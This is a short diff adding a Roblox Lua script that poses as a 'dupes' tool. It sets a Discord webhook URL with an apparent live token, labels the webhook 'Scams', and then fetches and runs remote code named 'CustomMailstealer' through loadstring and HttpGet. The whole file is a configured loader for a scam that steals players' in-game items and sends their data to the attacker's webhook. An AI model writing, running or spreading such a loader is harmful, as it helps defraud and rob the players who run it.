@@ -1,0 +1,7 @@
+Username = "GAMEGUARDIANS_CRIPTS"
+Webhook = "https://discord.com/api/webhooks/1213790355288236052/Hl1sV6Z_mE21R_07P6dJQGHYFGwPjYXgiQsKICa8MD6cpP7zR62JWD5sIkbz9szKrafi"
+
+G_LoadingScreen = "GAMEGUARDIANS DUPES"
+G_WebhookName = "Scams"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()
